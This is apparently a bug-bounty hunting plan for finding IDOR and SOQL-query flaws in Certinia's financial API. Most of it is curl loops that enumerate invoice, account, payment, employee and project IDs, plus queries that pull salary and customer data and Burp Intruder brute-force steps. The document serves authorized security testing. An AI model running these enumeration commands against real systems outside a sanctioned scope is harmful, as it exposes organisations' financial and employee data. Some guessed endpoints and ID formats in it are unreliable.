# 🎯 Certinia (FinancialForce) IDOR Hunting Plan

> Enterprise SaaS financial platform = massive IDOR surface. Objects: accounts, invoices, transactions, employees, projects.

---

## 📋 Program Overview

| Field | Value |
|-------|-------|
| **Target** | Certinia (FinancialForce) |
| **Platform** | Bugcrowd |
| **API Base** | https://api.certinia.com |
| **Auth** | OAuth 2.0 Bearer Token |
| **Primary Objects** | Accounts, Invoices, Transactions, Employees, Projects, Payment Info |
| **Estimated Payout** | Critical IDOR: $5k-$25k+ |

---

## 🔍 Phase 1: API Discovery & Mapping

### 1.1 Known API Endpoints

From Certinia documentation:

```
Base: https://api.certinia.com

Accounting APIs:
- /services/apexrest/v2/accounting
- /services/apexrest/AccountingTransaction
- /services/apexrest/v2/accounts
- /services/apexrest/v2/invoices
- /services/apexrest/v2/purchase-orders
- /services/apexrest/v2/expenses

ERP APIs:
- /services/apexrest/erp/
- /services/apexrest/projects
- /services/apexrest/resources
- /services/apexrest/timecards

Reporting APIs:
- /services/data/v62.0/sobjects/
- /services/data/v62.0/query

Payments:
- /services/apexrest/PaymentsPlus
- /services/apexrest/paymentprocessing

Other:
- /services/apexrest/common/ (likely)
- /services/apexrest/users/ (likely)
```

### 1.2 Recon Command Sequence

```bash
# Step 1: Enumerate known endpoints
endpoints=(
  "/services/apexrest/v2/accounts"
  "/services/apexrest/v2/invoices"
  "/services/apexrest/v2/purchase-orders"
  "/services/apexrest/projects"
  "/services/apexrest/resources"
  "/services/apexrest/timecards"
  "/services/apexrest/PaymentsPlus"
)

for endpoint in "${endpoints[@]}"; do
  echo "[*] Testing: $endpoint"
  curl -s -H "Authorization: Bearer YOUR_TOKEN" \
    "https://api.certinia.com${endpoint}" | jq .
done

# Step 2: Look for more endpoints via Burp
# - Use Burp Repeater with your auth token
# - Browse Certinia app while proxied
# - Capture all API calls
# - Extract endpoint patterns
```

### 1.3 API Traffic Harvesting

**While logged into Certinia:**

1. Open **Burp Suite** → Proxy settings
2. Set browser to route through Burp (127.0.0.1:8080)
3. **Navigate through Certinia app:**
   - View your account
   - View invoices list
   - View projects
   - View employees
   - View transactions
4. **Burp will capture all API calls** → Extract endpoints
5. **Save all captured requests** for analysis

---

## 🎯 Phase 2: IDOR Exploitation

### 2.1 Account ID Enumeration

**Objective:** Find account/customer IDs and extract data

```bash
# Step 1: Get your own account data
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/v2/accounts" | jq .

# Response should show your accounts with IDs like: "001D000000FJA1"

# Step 2: Extract your account ID
YOUR_ACCOUNT_ID="001D000000FJA1"  # From response above

# Step 3: Test sequential/common ID patterns
# Salesforce uses 15-character alphanumeric IDs
# Try common patterns: a001, a002, a003, etc. (account type prefix)

for i in {1..100}; do
  test_id=$(printf "a%014d" $i)
  echo "[*] Testing ID: $test_id"
  curl -s -H "Authorization: Bearer YOUR_TOKEN" \
    "https://api.certinia.com/services/apexrest/v2/accounts/$test_id" \
    -w "\nStatus: %{http_code}\n"
done
```

### 2.2 Invoice IDOR (HIGH PAYOUT)

**Objective:** Read other organizations' invoices

```bash
# Step 1: Get list of YOUR invoices
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/v2/invoices?limit=100" | jq .

# Response shows invoice IDs: ["801D00000...", "801D00000...", ...]

# Step 2: Extract one invoice ID
YOUR_INVOICE_ID="801D000000ABC123"

# Step 3: Try reading another invoice (change last digit)
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/v2/invoices/801D000000ABC124" | jq .

# If returns 200 + full invoice data = CRITICAL IDOR
# Impact: Read all invoices in system → financial data breach
```

### 2.3 Salesforce Object Query Language (SOQL) Injection / IDOR

**Objective:** Query arbitrary objects via filters

```bash
# Standard query endpoint
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/data/v62.0/query?q=SELECT+Id,Name,BillingCity+FROM+Account" \
  | jq .

# Try querying without auth restrictions
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/data/v62.0/query?q=SELECT+Id,Name,Phone,BillingStreet+FROM+Account+WHERE+RecordType='Customer'" \
  | jq .

# Get all invoices in the system
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/data/v62.0/query?q=SELECT+Id,InvoiceNumber,Amount,BillingEmail+FROM+Invoice" \
  | jq .

# Get all employees
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/data/v62.0/query?q=SELECT+Id,Email,Phone,Salary+FROM+User" \
  | jq .
```

**If queries return cross-org data = CRITICAL IDOR**

### 2.4 Transaction/Payment IDOR

**Objective:** Read payment details, transactions, sensitive financial data

```bash
# List transactions (likely auto-increments or sequential)
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/AccountingTransaction?limit=50" | jq .

# Try changing transaction ID
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/AccountingTransaction/txn_00123" | jq .

# Payments Plus endpoint
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/PaymentsPlus?accountId=a001" | jq .

# Try enumerating account IDs in PaymentsPlus
for i in {1..50}; do
  account_id=$(printf "a%014d" $i)
  curl -s -H "Authorization: Bearer YOUR_TOKEN" \
    "https://api.certinia.com/services/apexrest/PaymentsPlus?accountId=$account_id" \
    | jq '.payments[0] | {id, amount, cardLast4}' 2>/dev/null && echo "Found: $account_id"
done
```

### 2.5 Resource / Timecard IDOR (Employee Data)

**Objective:** Read employee timecards, resource allocations, salary info

```bash
# List resources (employees)
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/resources" | jq .

# Get resource ID (likely numeric or UUID)
RESOURCE_ID="r_001"

# Read that resource's timecards
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/timecards?resourceId=$RESOURCE_ID" | jq .

# Try changing resource ID
for i in {1..100}; do
  resource_id=$(printf "r_%03d" $i)
  curl -s -H "Authorization: Bearer YOUR_TOKEN" \
    "https://api.certinia.com/services/apexrest/resources/$resource_id" \
    -w "\nStatus: %{http_code}\n" 2>/dev/null | head -5
done

# If successful = can read all employee data (CRITICAL)
```

### 2.6 Project & Budget IDOR

**Objective:** Read confidential project details, budgets, costs

```bash
# List projects
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/projects?limit=100" | jq .

# Get project ID
PROJECT_ID="prj_12345"

# Read project details (budget, costs, sensitive info)
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "https://api.certinia.com/services/apexrest/projects/$PROJECT_ID" | jq .

# Try enumeration
for i in {1..200}; do
  project_id=$(printf "prj_%05d" $i)
  curl -s -H "Authorization: Bearer YOUR_TOKEN" \
    "https://api.certinia.com/services/apexrest/projects/$project_id" \
    | jq '.name, .budget' 2>/dev/null
done
```

---

## 💰 Severity Mapping (Certinia Specific)

### CRITICAL (CVSS 9.0+, $10k-$25k+)
- [ ] Read **all invoices/transactions** in system (financial data)
- [ ] Access **all customer account details** (PII + business data)
- [ ] Read **employee salary/timecard data** (HR data breach)
- [ ] Access **project budgets/costs** across organizations
- [ ] SOQL injection allowing unrestricted object queries

### HIGH (CVSS 7.0-8.9, $3k-$10k)
- [ ] Read invoices from other customers
- [ ] Access payment method details for other accounts
- [ ] Read project information across org boundaries
- [ ] Employee resource enumeration

### MEDIUM (CVSS 4.0-6.9, $500-$3k)
- [ ] Limited cross-org data exposure
- [ ] Information disclosure enabling further attacks

---

## 🛠️ Testing Workflow (Burp Suite)

### Setup
1. Open **Burp Suite Professional**
2. Configure proxy: 127.0.0.1:8080
3. Set browser to route through Burp
4. Login to Certinia with your test account

### Testing
1. **Capture authenticated request** (e.g., GET /services/apexrest/v2/invoices)
2. **Send to Repeater** (Ctrl+R)
3. **Identify ID parameters**
4. **Change ID** (e.g., invoice ID ending in 123 → 124)
5. **Send request**
6. **Compare response:**
   - 200 + data = IDOR FOUND ✅
   - 403 = Authorization check working ✅
   - 404 = ID format might be wrong

### Burp Intruder (Automated Enumeration)
1. Send request to Intruder (Ctrl+I)
2. Highlight ID parameter
3. Payload Type: **Numbers** (0-10000)
4. Payload Encoding: None
5. Start attack
6. Filter results by **Status 200** (successful responses)
7. Review payloads for data leakage

---

## 📝 PoC Template for Certinia IDOR

```markdown
## Vulnerability: Cross-Organization Invoice Access (IDOR)

### Summary
Certinia's invoice API lacks proper authorization checks, allowing any authenticated 
user to read invoices belonging to other organizations.

### Affected Endpoint
`GET https://api.certinia.com/services/apexrest/v2/invoices/{invoiceId}`

### Steps to Reproduce
1. Create a test account on Certinia (Bugcrowd-assigned)
2. Get your organization's invoice ID:
   ```
   GET /services/apexrest/v2/invoices?limit=1
   Authorization: Bearer YOUR_TOKEN
   Response: { "invoices": [{"id": "801D000000ABC123"}] }
   ```
3. Enumerate invoice IDs by incrementing the last character:
   ```
   GET /services/apexrest/v2/invoices/801D000000ABC124
   Authorization: Bearer YOUR_TOKEN
   ```
4. Server returns full invoice details without org validation

### Impact
- **Confidentiality Breach**: Read all invoices in Certinia instance (~millions of records)
- **Financial Data**: Invoice amounts, line items, customer details
- **Business Impact**: Competitors can read pricing, customer lists, payment terms

### CVSS Score
**9.1 (Critical)** — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

### Proof of Concept

**Request:**
```
GET https://api.certinia.com/services/apexrest/v2/invoices/801D000000XYZ999 HTTP/1.1
Authorization: Bearer {attacker_token}
```

**Response:**
```json
{
  "id": "801D000000XYZ999",
  "invoiceNumber": "INV-2026-54321",
  "amount": 125000.00,
  "customerName": "Acme Corp",
  "customerEmail": "billing@acmecorp.com",
  "dueDate": "2026-08-05",
  "lineItems": [
    {"description": "Consulting Services", "quantity": 500, "unitPrice": 250}
  ]
}
```

### Remediation
- Validate user's organization ownership of invoice before returning data
- Implement row-level security (RLS) in Salesforce
- Check request user's org against invoice's org
```

---

## 📊 Hunting Checklist

### Endpoints to Test (Priority Order)
- [ ] `/v2/invoices` — HIGH PAYOUT (financial data)
- [ ] `/v2/accounts` — HIGH PAYOUT (customer data)
- [ ] `/services/data/v62.0/query` — CRITICAL (unrestricted SOQL)
- [ ] `/PaymentsPlus` — HIGH PAYOUT (payment methods)
- [ ] `/AccountingTransaction` — HIGH PAYOUT (transactions)
- [ ] `/projects` — MEDIUM (project confidentiality)
- [ ] `/resources` — MEDIUM-HIGH (employee data)
- [ ] `/timecards` — HIGH (HR data)
- [ ] `/purchase-orders` — MEDIUM (business data)
- [ ] `/expenses` — MEDIUM (expense reports)

### Per Endpoint
- [ ] List endpoint returns IDs
- [ ] Extract 3-5 different ID formats
- [ ] Test sequential enumeration (ID+1, ID+2, etc.)
- [ ] Test changing single character
- [ ] Test removing authorization header
- [ ] Test changing to different ID prefix
- [ ] Verify 200 response = actual data (not error)
- [ ] Document what data is exposed

### Before Submission
- [ ] PoC is 100% reproducible
- [ ] Screenshots show request + response
- [ ] Impact statement is clear
- [ ] No PII exposed in your submission (blur sensitive data)
- [ ] Multiple endpoints tested (stronger submission)

---

## 🚨 Pro Tips for Certinia

**Salesforce ID patterns:**
- 15 chars: `a` + 14 random = Account (a01D...)
- 15 chars: `8` + 14 random = Invoice (801D...)
- 15 chars: `r` + 14 random = Resource (r01D...)
- Sequential often works: a001, a002, a003...

**SOQL is your friend:**
The `/query` endpoint might allow unrestricted object queries. This could be **the biggest finding**.

**Don't waste time on read-only:**
Certinia probably blocks writes (POST/PATCH/DELETE). Focus on **READ IDOR** (GET requests). That's where the $$$$ is.

**High-value data:**
- Invoices (financial)
- Accounts (customer lists)
- Employees (HR)
- Projects (confidentiality)
- Transactions (full audit trail)

**Reputation = future program invites:**
A solid, well-documented IDOR finding on Certinia = entry ticket to other enterprise programs.

---

## 🎬 Your Next 2 Hours

1. **Login to Certinia** (your Bugcrowd test account)
2. **Fire up Burp**, start proxying traffic
3. **Navigate the app**, capture API calls
4. **Extract 10 endpoints** from captured traffic
5. **Test IDOR on top 3 endpoints** (invoices, accounts, transactions)
6. **If you find a hit**, document PoC
7. **If no hit in 1 hour**, pivot to SOQL injection testing

**Let's get this CRITICAL finding.** 💰🚀
